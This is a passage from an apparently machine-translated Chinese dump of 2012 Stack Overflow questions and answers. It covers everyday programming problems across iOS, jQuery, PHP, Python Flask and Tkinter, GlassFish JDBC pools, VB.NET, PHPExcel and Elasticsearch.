    [homeWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://www.socialstarsclub.com"] ]];
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
if (self) {
    self.title = NSLocalizedString(@"Home", @"Home");
    self.tabBarItem.image = [UIImage imageNamed:@"home_30"];
}
return self;
}
- (void)viewDidLoad
{
[super viewDidLoad];
    [self.homeNavBar setBarStyle:UIBarStyleBlackOpaque];
[homeWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://www.socialstarsclub.com"] ]];
}

- (void)didReceiveMemoryWarning
{
[super didReceiveMemoryWarning];
// Dispose of any resources that can be recreated.
}

@end 
```

我已经尝试了“showWithLable”的代码变体，试图将 HUD 设置在最高视图继承人 achy 上，但总是收到相同的错误，谁能看到我的编码中可能是一个简单的错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T13:49:36.967

哇。出于某种原因，使用 Clean and Build (Command + Shift + K) 并遵循此线程，[在实现 EGOPhotoViewer](https://stackoverflow.com/questions/12915493/got-error-in-implementing-egophotoviewer)时出错，我必须在目标菜单中的已编译源下添加 MBProgressHUD.h 和 MBProgressHUD.m。

然后改变：

```
HUD = [[MBProgressHUD alloc] initWithView:self.navigationController.view]; 
```

&

```
[self.navigationController.view addSubview:HUD]; 
```

至：

```
HUD = [[MBProgressHUD alloc] initWithView:self.tabBarController.view]; 
```

&

```
[self.tabBarController.view addSubview:HUD]; 
```

# jquery - 在结帐输入中添加 +1d

> ID：13217805
> 
> 赞同：1
> 
> 时间：2012-11-04T10:36:38.930
> 
> 标签：jquery, datapicker

我无法在结帐输入框中添加 +1day...这是我的代码，如果我在检查时选择一个日期，y 只会在结帐时自动获得相同的日期，我找不到错误，我尝试了一些选项。我修改了 onselect 函数，但我无法得到我想要的结果......只有 JavaScript 的错误和错误......

```
<script>
$(function() {
$('#checkin').bind('focus',function(){
      $('#ui-datepicker-div').css('visibility','visible');
});
$('#checkin').datepicker({
  numberOfMonths: 1,
  minDate: 0,
  onClose: function(dateText, inst) {
      var endDateTextBox = $('#checkout');
      if (endDateTextBox.val() != '') {
          var testStartDate = new Date(dateText);
          var testEndDate = new Date(endDateTextBox.val());
          if (testStartDate > testEndDate)

              endDateTextBox.val(dateText);
      }
      else {
          endDateTextBox.val(dateText);
      }
  },
  onSelect: function (selectedDateTime){
      var start = $(this).datetimepicker('getDate');
      $('#checkout').datetimepicker('option', 'minDate', new Date(start.getTime()));
      $('#ui-datepicker-div').css('visibility','visible');
  }
});

});
$('#checkout').datepicker({
  numberOfMonths: 1,
  minDate: 0,
  onClose: function(dateText, inst) {
      var startDateTextBox = $('#checkin');
      if (startDateTextBox.val() != '') {
          var testStartDate = new Date(startDateTextBox.val());
          var testEndDate = new Date(dateText);
          if (testStartDate > testEndDate)
              startDateTextBox.val(dateText);
      }
      else {
          startDateTextBox.val(dateText);
      }
  },
  onSelect: function (selectedDateTime){
      var end = $(this).datetimepicker('getDate');
      $('#checkin').datetimepicker('option', 'maxDate', new Date(end.getTime()) );
              refresh_subtotal();

  }
});
</script> 
```

# javascript - 向 jquery validationEngine 表单添加新输入？

> ID：13217808
> 
> 赞同：0
> 
> 时间：2012-11-04T10:36:43.863
> 
> 标签：javascript, html, jquery, jquery-validation-engine

[对于带有jQ​​uery Validation Engine](https://github.com/posabsolute/jQuery-Validation-Engine)的表单，我在`onValidationComplete`函数中有一些相当复杂的 ajax 逻辑等。

这是完美的工作，但有一件事困扰着我。

在表单中，我能够动态添加输入（添加新行按钮）。

所以我的代码结构看起来像：

var form = $('#myForm');

```
form.validationEngine('attach', {onValidationComplete:validationComplete});
$('#newInput').on('click', function(){
    form.append('<input />');
    form.validationEngine('detach');
    form.validationEngine('attach', {onValidationComplete:validationComplete});
});

function validationComplete(form, status){/*all my logic here*/} 
```

我不喜欢的是，每次添加新输入时，我都必须分离然后重新附加`validationEngine`.

有什么方法可以告诉它将新输入添加到要验证的输入列表中吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:59:02.367

您是否尝试过使用[.on()](http://api.jquery.com/on/)方法？

# javascript - Zynga Scroller - 检测单元格点击

> ID：13217816
> 
> 赞同：4
> 
> 时间：2012-11-04T10:37:08.707
> 
> 标签：javascript, html

[我在 github 站点上](http://zynga.github.com/scroller/)或在谷歌搜索如何检测 Zynga Scroller 的点击事件时找不到任何示例。

例如，从[Pull-to-refresh](http://zynga.github.com/scroller/demo/dom-list.html)演示开始，它包含以下代码：

```
if ('ontouchstart' in window) {
    container.addEventListener("touchstart", function(e) {
        scroller.doTouchStart(e.touches, e.timeStamp);
        e.preventDefault(); // Problem !!! 
}, false); 
```

由于我们一直在阻止默认设置，因此我永远无法单击可滚动列表中的一行。如果我删除该行，我可以单击但滚动不起作用。

有没有其他方法来检测点击？

（在计算机上它可以工作，但不能在具有 ontouchstart 事件的智能手机上，（iPhone 4s））

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T00:19:04.333

这是因为 scrollerObject 会阻止用户操作，具体取决于您在 EazyScroller.js 上使用的 Zynga 滚动插件，搜索此代码**`that.scroller.doTouchStart(e.touches, e.timeStamp)`**并删除下一行的~~e.preventDefault() ：~~

> that.scroller.doTouchStart(e.touches, e.timeStamp);
> //e.preventDefault();

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-28T09:47:39.920

检查 阻止`e.preventDefault();`。`touchstart`

评论它并添加`e.preventDefault();`到`touchmove`函数的末尾。

这对我有用。

# android - 将 Android 无线连接到 Arduino 的最快方法是什么？

> ID：13217822
> 
> 赞同：1
> 
> 时间：2012-11-04T10:38:31.737
> 
> 标签：android, bluetooth, arduino, connect

我正在寻找一种非常快速、简单、主要是即插即用的方式来将 Android 无线连接到 Arduino。我正在寻找非常基本的功能，例如读取一些传感器，向我选择的引脚发送几个“AnalogWrite”命令，仅此而已。

对我来说最方便的方法是通过 BT 模块（距离不需要超过 50 米）。

我希望有更多经验或以前做过这件事的人会好心让我知道是否有任何其他简单的即插即用连接方式（wi-fi direct，通过网络服务和网络模块Arduino板...？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:44:56.960

就个人而言，我是通过蓝牙模块（如 SparkFun 的[蓝牙伴侣银](https://www.sparkfun.com/products/10393)或[BlueSMiRF](https://www.sparkfun.com/products/10269)银）完成的。

这让您可以设置与 TX/RX 的直通。在 Arduino 方面，您只需要编写一个串行读/写应用程序来处理交互。您在启动时设置调制解调器，打开串行通道并等待交互。

在 Android 端，您可以连接到调制解调器并发送/接收命令。

另一方面，如果您查看适用于 Android 的[IOIO](https://www.sparkfun.com/products/10748)，如果您设置了正确的主机控制器，您应该能够通过 USB 通话。您可以查看那里的 Wiki 和 Schematics 以可能调整如何做到这一点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-05T10:54:48.833

我认为最快和最便宜的方法是来自中国的蓝牙模块：HC-05、HC-06 等。每个模块 6-7 美元。参见工作示例：[http ://english.cxem.net/arduino/arduino4.php](http://english.cxem.net/arduino/arduino4.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:56:30.680

我已经尝试了至少六种[连接 Android 和 Arduino](http://sudarmuthu.com/blog/building-robots-using-arduino-and-android-at-droidcon)的方法。在所有的蓝牙中，似乎是最简单的一个。

您也可以尝试使用 wifi 连接它们。但是你需要他们两个都在同一个网络中，你还需要一个 Arduino 的 wifi shield。

# php - 无法从 Web 窗体获取值到要显示的 PHP 类

> ID：13217823
> 
> 赞同：0
> 
> 时间：2012-11-04T10:39:01.047
> 
> 标签：php, class

我无法从使用 PHP 类文件通过 Web 表单提交的变量中获取值。

这是我的网页结构：

*   订单页面
*   Process.php 页面
*   Book.php 页面

我可以轻松获取输入的用户数据（在订单页面上）、处理并将其显示在 Process.php 页面上。问题是我必须创建一个 Book 类并使用 Book 类打印数据的详细信息。

我有一个空的构造函数打印出“created”，所以我知道我的构造函数正在被调用。我还可以打印单词“title”，所以我知道我可以使用 Book 类打印到屏幕上。

我的问题是我无法在 Book 类的变量中获取值。

这是我的变量声明：

```
 private $title; 
```

这是我的 printDetails 函数：

```
 public function printDetails () {
    echo "Title: " . $this->title . "<br />";
    } 
```

这是我的 book 类的新实例：

```
 $bookNow = new book; 
```

这是我的获取和设置功能：

```
 function __getTitle($title)
{
    return $this->$title;
}

    function __setTitle($title,$value)
{
    $this->$title = $value;
} 
```

我确实还有其他四个变量要显示。它们中的每一个都有自己的变量声明、printDetails 中的一行以及它们自己的 setter 和 getter。

最后，我还在我的 PHP 流程中调用了 Book 类。它看起来像这样：

```
 function __autoload($book) {
        include $book . '.php'; 
    }
    $bookNow = new book(); 
```

任何帮助，非常感谢。它一定是非常小的东西（我希望如此）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:58:30.963

`_setTitle()`应该只有一个参数，并删除`$`赋值语句中的第二个字符（也是 for `getTitle()`），如下所示：

```
function _setTitle($title)
{
    $this->title = $title;
} 
```

现在这样称呼它：

```
$title = !empty($_POST["title"]) ? $_POST["title"] : NULL;
$bookNow->_setTitle($title); 
```

除非您正在处理魔术函数，否则不要使用双下划线。我认为这是不好的做法。还要检查你班级的案例——即使 php 对案例非常放松。如果您的类文件名为“Book.php”，那么您的构造函数应该以大写形式调用以确保（也可能使用括号）。

编辑：好的，这是我制作的课程，效果很好，我对其进行了测试：

```
class Book {

    private $title;

    function __construct() {}

    function _getTitle($title)  {
        return $this->title;
    }

    function _setTitle($title) {
        $this->title = $title;
    }

    public function printDetails() {
        echo "Title: " . $this->title . "<br />";
    }

} 
```

确保在 POST 中获得一个值，如下所示：

```
$title = !empty($_POST["title"]) ? $_POST["title"] : 'No Title Found!';
$bookNow = new Book();
$bookNow->_setTitle($title);
$bookNow->printDetails(); 
```

注意：不要将上述语句放在“book.php”类文件中。

如果您的表单提交出错，您将看到“未找到标题！”，否则您将看到正确的标题。

# python - 如何获得 Tkinter 入口？

> ID：13217825
> 
> 赞同：2
> 
> 时间：2012-11-04T10:40:06.910
> 
> 标签：python, tkinter

在这种情况下，我将如何实现“OnButtonClick”，以便在按下按钮时打印“e1”的用户输入？

```
from Tkinter import *

class App:    
    def __init__(self, master):
        e1 = Entry(master)
        e1.grid(row=1, column=0, sticky=N)
        Button(master, text="Start", command=self.OnButtonClick).grid(row=4, column=0)

    def OnButtonClick(self):

if __name__ == "__main__":
    root = Tk()
    app = App(root)
    root.mainloop() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:18:25.573

You need to store a reference to your `entry` instance on you App:

```
class App:    
    def __init__(self, master):
        self.e1 = Entry(master)
        self.e1.grid(row=1, column=0, sticky=N)
        Button(master, text="Start", command=self.OnButtonClick).grid(row=4, column=0) 
```

Now you can access `self.e1` from `OnButtonClick` and call it`s`.get()` method to get the current entry text:

```
 def OnButtonClick(self):
        value = self.e1.get() 
```

# python - Python Flask 使 WTForm 可用于所有模板

> ID：13217827
> 
> 赞同：1
> 
> 时间：2012-11-04T10:40:47.473
> 
> 标签：python, flask, wtforms

我有一个应该出现在所有模板中的登录表单，因此在每个 render_template() 中将其作为参数传递并不方便。我试图把它放在这样的环境全局变量中：

```
app = Flask(__name__)
app.jinja_env.globals['loginform'] = LoginForm() 
```

但它抛出异常：`raise RuntimeError('working outside of application context')`

如何在 Flask 中正确执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:07:06.587

我认为你应该能够通过使用上下文处理器来实现这一点：http:
[//flask.pocoo.org/docs/templating/#context-processors](http://flask.pocoo.org/docs/templating/#context-processors)

# actionscript-3 - AS3 - 如何“切出”具有过滤器的 Sprite 部分？

> ID：13217828
> 
> 赞同：0
> 
> 时间：2012-11-04T10:40:57.883
> 
> 标签：actionscript-3, flash, filter

我在使用'drawPath'时绘制了一个Sprite。

然后我使用以下方法对这个 Sprite 应用过滤器：

```
var myBlur:BlurFilter = new BlurFilter();
myBlur.blurX = 10;
myBlur.blurY = 10;
_alphaMask.filters = [myBlur]; 
```

然后我需要“剪切”出精灵的一部分并将其用作不同精灵的蒙版。

问题是 - 当我剪掉 Sprite 时 - 我需要剪下的“边缘”不会模糊，

但是“BlurFilter”应用在“cut”Sprite 上，所以边缘是模糊的。

这是[图片中的问题](http://s11.postimage.org/820by8y29/Prblm_Mask2.png)：

[图片中的问题 http://s11.postimage.org/820by8y29/Prblm_Mask2.png](http://s11.postimage.org/820by8y29/Prblm_Mask2.png)

我想到了一种解决方法，它有两个问题：

将带有过滤器的 Sprite 中的 BitmapData 绘制到新的 Sprite，然后在新的 Sprite 上使用“scrollRect”。

这种方法有两个问题：

1.  业绩命中
2.  不能让它工作...

有人能告诉我如何在不复制位图数据的情况下解决这个需求吗？

**更新**

这是我使用的代码片段：

```
private var _alphaMask:Sprite;

private createMask():void
{
    _alphaMask = new Sprite();
    _alphaMask.visible = true;

    // Clear the mask
    _alphaMask.graphics.clear();

    // Create the mask vertices (the 'drawPath' coordinates)
    var maskPoints:Vector.<Number> = new Vector.<Number>(5);
    maskPoints.push(100);   maskPoints.push(100);
    maskPoints.push(200);   maskPoints.push(200);
    maskPoints.push(230);   maskPoints.push(310);
    maskPoints.push(140);   maskPoints.push(170);
    maskPoints.push(130);   maskPoints.push(190);

    // Create the 'drawPath' commands
    var commands:Vector.<int> = new Vector.<int>(commandLen);
    commands.push(1);
    commands.push(2);
    commands.push(2);
    commands.push(2);
    commands.push(2);

    // Draw the vertices on the mask
    _alphaMask.graphics.beginFill(0x0000FF);
    _alphaMask.graphics.drawPath(commands, clonedMaskPoints);
    _alphaMask.graphics.endFill();

        // Add the Blur filter to the mask
    var myBlur:BlurFilter   = new BlurFilter();
    myBlur.blurX            = myBlur.blurY = 10;
    _alphaMask.filters      = [myBlur];

    // Now I need to 'Cut Out' a section of the mask (and use it for something else...)
    // This section cuts out the part of the mask I need, but it 'reapplies' the blur filter on the entire cut mask
    var scrollRect_x:Number         = 100;
    var scrollRect_y:Number         = 100;
    var scrollRect_width:Number     = 300;
    var scrollRect_height:Number    = 200
    _alphaMask.scrollRect = new Rectangle(scrollRect_x, scrollRect_y, scrollRect_width, scrollRect_height);
} 
```

这就是我试图解决的问题（没有成功）：

```
var alphaBitmapData:BitmapData = new BitmapData(_alphaMask.width, _alphaMask.height);
alphaBitmapData.draw(_alphaMask);
_alphaMask.graphics.clear();
_alphaMask.graphics.beginBitmapFill(alphaBitmapData);
_alphaMask.graphics.endFill(); 
```

# java - 为什么在部署时验证 Java JDBC 连接池

> ID：13217829
> 
> 赞同：4
> 
> 时间：2012-11-04T10:41:09.597
> 
> 标签：java, jakarta-ee, jdbc, glassfish

为什么 Java JDBC 连接池会在部署时进行验证？

我在部署 Java EE 应用程序 (.ear) 时遇到问题。问题与我在我的应用程序中使用的 JDBC 连接池有关。我无法在服务器上部署应用程序。这是我在控制台上得到的：

```
WARNING: RAR5038:Unexpected exception while creating resource for pool oracle_PROD_Pool. Exception : javax.resource.spi.ResourceAllocationException: Connection could not be allocated because: Wyjątek we-wy: The Network Adapter could not establish the connection
WARNING: RAR5117 : Failed to obtain/create connection from connection pool [ oracle_PROD_Pool ]. Reason : com.sun.appserv.connectors.internal.api.PoolingException: Connection could not be allocated because: Wyjątek we-wy: The Network Adapter could not establish the connection
WARNING: RAR5114 : Error allocating connection : [Error in allocating a connection. Cause: Connection could not be allocated because: Wyjątek we-wy: The Network Adapter could not establish the connection]
SEVERE: Local Exception Stack:
Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: java.sql.SQLException: Error in allocating a connection. Cause: Connection could not be allocated because: Wyjątek we-wy: The Network Adapter could not establish the connection
Error Code: 0... 
```

然后我得到 SQLException 堆栈跟踪并且部署失败。

我知道这是因为无法访问数据库服务器并且无法创建连接，但我还是想部署应用程序并在“应用程序使用时间”获取 SQLException。这是我的 jdbc 连接池定义：

```
<jdbc-connection-pool allow-non-component-callers="false" 
                          associate-with-thread="false" 
                          connection-creation-retry-attempts="0" 
                          connection-creation-retry-interval-in-seconds="10" 
                          connection-leak-reclaim="false" 
                          connection-leak-timeout-in-seconds="0" 
                          connection-validation-method="auto-commit" 
                          datasource-classname="oracle.jdbc.pool.OracleConnectionPoolDataSource" 
                          fail-all-connections="true" 
                          idle-timeout-in-seconds="300" 
                          is-connection-validation-required="true" 
                          is-isolation-level-guaranteed="true" 
                          lazy-connection-association="false" 
                          lazy-connection-enlistment="false" 
                          match-connections="false" 
                          max-connection-usage-count="0" 
                          max-pool-size="32" 
                          max-wait-time-in-millis="60000" 
                          name="oracle_PROD_Pool" 
                          non-transactional-connections="false" 
                          pool-resize-quantity="2" 
                          res-type="javax.sql.ConnectionPoolDataSource" 
                          statement-timeout-in-seconds="-1" 
                          steady-pool-size="8" 
                          validate-atmost-once-period-in-seconds="0" 
                          wrap-jdbc-objects="true">
        <property name="User" value="user"/>
        <property name="DatabaseName" value="PROD"/>
        <property name="Password" value="pass"/>
        <property name="DataSourceName" value="OracleConnectionPoolDataSource"/>
        <property name="ServerName" value="172.27.0.101"/>
        <property name="DriverType" value="thin"/>
        <property name="ExplicitCachingEnabled" value="false"/>
        <property name="MaxStatements" value="0"/>
        <property name="NetworkProtocol" value="tcp"/>
        <property name="ImplicitCachingEnabled" value="false"/>
        <property name="URL" value="jdbc:oracle:thin:@172.27.0.101:1521:PROD"/>
        <property name="PortNumber" value="1521"/>
        <property name="LoginTimeout" value="0"/>
    </jdbc-connection-pool> 
```

和相关的 jdbc 资源：

```
<jdbc-resource enabled="true" jndi-name="jdbc/oraclePROD" object-type="user" pool-name="oracle_PROD_Pool"/> 
```

在我迁移到新版本的 GlassFish server 3.1.2.2 后出现此问题。早些时候我一直在使用 glassFish 3.1.1 (build 12) 并且部署没有问题，我的意思是在部署时没有检查和填充连接池，当我的应用程序尝试执行从数据库获取数据的代码时，它已经存在使用来自描述的 jdbc 连接池的连接。

我对此感到有些沮丧。有没有办法在部署时禁用创建和填充 jdbc 连接池？预先感谢您的任何帮助。——雅罗斯瓦夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-19T20:59:20.447

通过将最小/初始连接池大小设置为零来避免连接池创建连接。检查特定于您的连接池和应用服务器的文档。对于 Apache Tomcat JDBC 连接池，这是“initialSize”，对于 Oracle 通用连接池，这可能是“minPoolSize”。有时可能很难找到确切的设置，因为在某些情况下，连接池是通过 Web 管理控制台设置的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T00:09:41.607

如您所见，连接池不是 API。它也不是可以按需初始化的 bean。服务器正在尝试在服务器启动时创建连接池。这就像在服务器启动后创建一个线程池。对于任何使用数据库运行的应用程序，始终建议在服务器启动时创建和初始化池。

如果您确实需要将应用程序与数据库连接池解耦，则*需要将应用程序中的数据库连接服务作为 API 进行隔离。*意思是，不要将数据库连接用作服务，而是用作 API。

这将使应用程序有责任在看起来合适时初始化服务。

# java - 长按视图时显示菜单

> ID：13217830
> 
> 赞同：0
> 
> 时间：2012-11-04T10:41:12.437
> 
> 标签：java, android, onclick, contextmenu

关于我的问题，我一直在互联网上四处寻找，但我找不到一个直接的答案。是否可以在长按视图时创建类似于 Android 4.0+ 中的溢出菜单的非阻塞菜单？

我有许多`LinearLayout`实例都有一个 OnLongClickListener ，它会显示一个上下文菜单，但这并不是我想要的。我希望有一个更平滑的菜单，当单击其中一个实例时会显示该菜单，并在用户单击菜单区域之外时将其删除。这与 Android 中溢出菜单的行为方式非常相似`ActionBar`。

综上所述，是否可以在使用上下文菜单时复制溢出菜单的外观和行为？

希望我不必费劲儿就可以得到我想要的实现。

提前致谢。

**编辑**：经过一番挖掘，我发现`PopupMenu`这正是我正在寻找的，但它仅适用于运行 Honeycomb 及更高版本的设备。有谁知道我可以在旧版本的 Android 中复制此菜单行为而不使用像对话框这样的阻塞窗口的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:13:50.973

据我所知，PopupMenu 没有兼容性库。所以如果你想要它，你可以使用一个名为[ActionBarSherlock](http://actionbarsherlock.com/)的组件来达到同样的效果。

有关如何执行此操作的详细说明，请参见此处：

[https://stackoverflow.com/a/11765787/1369222](https://stackoverflow.com/a/11765787/1369222)

# vb.net - vb.net 通过自定义对象访问当前表单？

> ID：13217831
> 
> 赞同：1
> 
> 时间：2012-11-04T10:41:13.463
> 
> 标签：vb.net

下面的代码用于自定义菜单条。我正在尝试弄清楚如何访问当前打开的表单，以便我可以将其关闭。我基本上要做的是在用户单击以从当前表单导航到新表单时运行“ActiveForm.Close()”。

谢谢你的帮助！

```
Public Class MenuStripCustom
    Inherits MenuStrip

Private WithEvents NavToolStrip As New ToolStripMenuItem("File")
Private WithEvents NavMainMenu As New ToolStripMenuItem("Main Menu")
Private WithEvents NavSignOut As New ToolStripMenuItem("Sign Out")
Private WithEvents NavExit As New ToolStripMenuItem("Exit")

Sub New()
    Me.Items.Add(NavToolStrip)
    NavToolStrip.DropDownItems.Add(NavMainMenu)
    NavToolStrip.DropDownItems.Add(NavSignOut)
    NavToolStrip.DropDownItems.Add(NavExit)
End Sub

' All forms
Private Sub NavExit_Click(sender As Object, e As EventArgs) Handles NavExit.Click
    Application.Exit()
End Sub

Private Sub NavMainMenu_Click(sender As Object, e As EventArgs) Handles NavMainMenu.Click
    'MainMenu.visible = true
    'ActiveForm.Close()
End Sub 
```

结束类

编辑：没有为类定义“ActiveForm”，因为这是一个 MenuStrip 对象。当我将此对象放在表单上时，我不确定如何通过此类访问当前表单。我在代码底部注释掉了我想要做的事情。很抱歉造成混乱。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:53:05.443

您可以使用此静态属性访问活动表单：

```
Form.ActiveForm 
```

[http://msdn.microsoft.com/en-us/library/system.windows.forms.form.activeform.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.activeform.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:00:00.240

您可以设置 MenuStripCustom 类以在单击文件/退出时引发事件。您的表单将需要一个事件处理程序来处理它可以自行关闭的事件。

在 MenuStripCustom 中：

```
Public event ExitClicked 
```

在 NavExit_Click 中：

```
RaiseEvent ExitClicked 
```

在您的表格中：

```
Sub Exit() handles MyMenuStripCustomInstance.ExitClicked
    me.close
End Sub 
```

希望你越来越接近让这一切正常工作。

# ruby-on-rails - Radiant 1.1.0 的系统堆栈错误

> ID：13217832
> 
> 赞同：0
> 
> 时间：2012-11-04T10:41:36.057
> 
> 标签：ruby-on-rails, radiant

安装 Radiant 1.1.0 后，我可以运行 DEMO 站点。但是在查看了几个页面（公共页面或管理页面）之后，我得到了这些错误。

```
SystemStackError (stack level too deep):

Rendered rescues/_trace (1.4ms)
Rendered rescues/_request_and_response (1.1ms)
Rendering rescues/layout (internal_server_error)
Illegal instruction: 4 
```

我更改了我的 ruby​​ 堆栈大小，甚至重新安装了我的系统，但仍然无法修复错误。当我使用 radiant 1.0.1 时，我没有遇到任何问题。

我在用

```
rvm 1.16.17 (stable)
brew installed GCC /usr/local/Cellar/apple-gcc42/4.2.1-5666.3
mysql-5.5.27

RubyGems Environment:
  - RUBYGEMS VERSION: 1.8.24
  - RUBY VERSION: 1.9.3 (2012-10-12 patchlevel 286) [x86_64-darwin11.4.2]
  - INSTALLATION DIRECTORY: /Users/harry/.rvm/gems/ruby-1.9.3-p286@test1
  - RUBY EXECUTABLE: /Users/harry/.rvm/rubies/ruby-1.9.3-p286/bin/ruby
  - EXECUTABLE DIRECTORY: /Users/harry/.rvm/gems/ruby-1.9.3-p286@test1/bin
  - RUBYGEMS PLATFORMS:
    - ruby
    - x86_64-darwin-11
  - GEM PATHS:
     - /Users/harry/.rvm/gems/ruby-1.9.3-p286@test1
     - /Users/harry/.rvm/gems/ruby-1.9.3-p286@global
  - GEM CONFIGURATION:
     - :update_sources => true
     - :verbose => true
     - :benchmark => false
     - :backtrace => false
     - :bulk_threshold => 1000
  - REMOTE SOURCES:
     - http://rubygems.org/ 
```

我已经花了 2 周时间，但仍然无法解决。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:56:37.880

```
rvm install ree-head
rvm use ree-head
script/server 
```

现在，您可以检查问题

例如：

```
 SystemStackError (stack level too deep):
  /home/web/.rvm/rubies/ree-head/lib/ruby/1.8/pathname.rb:212:in `dup'
  /home/web/.rvm/rubies/ree-head/lib/ruby/1.8/pathname.rb:212:in `initialize'
  /home/web/.rvm/gems/ree-head/bundler/gems/radiant-7cc8f6e90d98/app/models/radiant/config.rb:121:in `cache_path' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T10:49:44.917

您在某处（可能在您的模型中）有一个无限递归调用。发布一些代码将有助于查明问题。

您可能不小心覆盖了核心 ruby​​ 类、函数中出现拼写错误、编写了递归关联或许多其他可能性。

# c++ - 更改 MFC 应用程序的输入控件

> ID：13217837
> 
> 赞同：0
> 
> 时间：2012-11-04T10:43:20.287
> 
> 标签：c++, visual-c++, mfc

我有一个从箭头键获取输入的 MFC 应用程序。我也有一个手势识别代码。我想将这两者集成起来，这样我就可以用我的手势程序的输出而不是箭头键来控制 MFC 应用程序。但我在 MFC 应用程序中找不到任何主要功能，以及如何进行的任何想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T08:44:52.020

当一个MFC程序开始执行时，MFC框架首先调用`CWinApp::InitInstance`（通常是调用你的app派生的这个函数`CWinApp`），所以你可以在这里进行程序初始化，你可以把清理代码放在`CWinApp::ExitInstance`

# loops - 循环工作表并清理phpexcel中每个工作表中的列

> ID：13217839
> 
> 赞同：0
> 
> 时间：2012-11-04T10:43:46.897
> 
> 标签：loops, while-loop, phpexcel

尝试循环进入每个工作表并清除 C 列中的任何 , 我收到消息 setactive index is out of bounds 请帮助。我已经添加了我的代码是否缺少步骤。

```
<?php
include'../Classes/PHPExcel.php';
include'../Classes/PHPExcel/IOFactory.php';

$objReader = PHPExcel_IOFactory::createReader('Excel2007');
$objPHPExcel = $objReader->load("../upload/combined.xlsx");
ini_set('max_execution_time', 2000);
$i = 0;
while ($objPHPExcel->setActiveSheetIndex($i)){

    $objWorksheet = $objPHPExcel->getActiveSheet();
    $highestRow = $objWorksheet->getHighestRow();

    for($cl=0;$cl<$highestRow+1;$cl++){
        $clean=$objPHPExcel->getActiveSheet()->getCell('C'.$cl)->getValue();
        $cleandone=str_replace(',',"",$clean);
        $objWorksheet->setCellValue('C'.$cl,$cleandone);
        $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
        $objWriter->save('../upload/combined.xlsx');
        $i++;
    }
}
echo "Done";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:20:20.390

Don't save the workbook after every single cell change

Don't try to access row 0, it doesn't exist... rows start at 1

Don't increase the sheet counter after every cell, but only after every sheet... in fact, why not simply retrieve the sheet count and loop through on a foreach rather than waiting for an error that your while has tried to access a non-existent worksheet before stopping:

```
<?php
include'../Classes/PHPExcel.php';
include'../Classes/PHPExcel/IOFactory.php';

$objReader = PHPExcel_IOFactory::createReader('Excel2007');
$objPHPExcel = $objReader->load("../upload/combined.xlsx");
ini_set('max_execution_time', 2000);

$worksheetCount = $objPHPExcel->getSheetCount();
for($i=0; $i < $worksheetCount; $i++) {
    $objPHPExcel->setActiveSheetIndex($i);
    $objWorksheet = $objPHPExcel->getActiveSheet();
    $highestRow = $objWorksheet->getHighestRow();

    for($cl=1; $cl<=$highestRow; $cl++) {
        $clean=$objWorksheet->getCell('C'.$cl)->getValue();
        $cleandone=str_replace(',',"",$clean);
        $objWorksheet->setCellValue('C'.$cl,$cleandone);
    }
}

$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
$objWriter->save('../upload/combined.xlsx');

echo "Done";
?> 
```

# elasticsearch - elasticsearch - 返回单个字段的词频

> ID：13217849
> 
> 赞同：2
> 
> 时间：2012-11-04T10:45:43.933
> 
> 标签：elasticsearch

我一直在尝试使用 facet 来获取字段的词频。我的查询只返回一个命中，所以我想让 facet 返回在特定字段中频率最高的术语。

我的映射：

```
{
"mappings":{
    "document":{
        "properties":{
            "tags":{
                "type":"object",
                "properties":{
                    "title":{
                        "fields":{
                            "partial":{
                                "search_analyzer":"main",
                                "index_analyzer":"partial",
                                "type":"string",
                                "index" : "analyzed"
                            }
                            "title":{
                                "type":"string",
                                "analyzer":"main",
                                "index" : "analyzed"
                            }
                        },
                        "type":"multi_field"
                    }
                }
            }
        }
    }
},

"settings":{
    "analysis":{
        "filter":{
            "name_ngrams":{
                "side":"front",
                "max_gram":50,
                "min_gram":2,
                "type":"edgeNGram"
            }
        },

        "analyzer":{
            "main":{
                "filter": ["standard", "lowercase", "asciifolding"],
                "type": "custom",
                "tokenizer": "standard"
            },
            "partial":{
                "filter":["standard","lowercase","asciifolding","name_ngrams"],
                "type": "custom",
                "tokenizer": "standard"
            }
        }
    }
}

} 
```

测试数据：

```
 curl -XPUT localhost:9200/testindex/document -d '{"tags": {"title": "people also kill people"}}' 
```

询问：

```
 curl -XGET 'localhost:9200/testindex/document/_search?pretty=1' -d '
{
    "query":
    {
       "term": { "tags.title": "people" }
    },
    "facets": {
       "popular_tags": { "terms": {"field": "tags.title"}}
    }
}' 
```

这个结果

```
"hits" : {
   "total" : 1,
    "max_score" : 0.99381393,
    "hits" : [ {
    "_index" : "testindex",
    "_type" : "document",
    "_id" : "uI5k0wggR9KAvG9o7S7L2g",
